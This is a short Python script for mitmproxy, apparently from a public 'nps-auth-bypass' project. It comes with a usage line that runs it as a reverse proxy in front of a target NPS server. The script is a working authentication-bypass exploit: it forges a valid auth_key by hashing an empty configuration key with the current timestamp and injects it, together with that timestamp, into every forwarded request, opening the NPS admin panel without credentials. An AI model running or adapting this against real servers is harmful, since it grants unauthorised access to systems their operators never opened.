# -*- encoding:utf-8 -*-
"""
@使用方法:
mitmdump -s main.py -p 8000 --mode reverse:http://x.x.x.x:x/
@项目地址:
https://github.com/carr0t2/nps-auth-bypass

"""
import time
import hashlib
import mitmproxy.http


def md5(s) -> str:
    m = hashlib.md5()
    m.update(s.encode())
    return m.hexdigest()


def request(flow: mitmproxy.http.HTTPFlow):
    r = flow.request
    config_auth_key = ""
    now_timestamp = str(int(time.time()))
    auth_key = md5(config_auth_key + now_timestamp)
    r.query.set_all('auth_key', [auth_key])
    r.query.set_all('timestamp', [now_timestamp])
    flow.request = flow.request.make(
        method=r.method,
        url=r.url,
        content=r.raw_content,
        headers=r.headers
    )
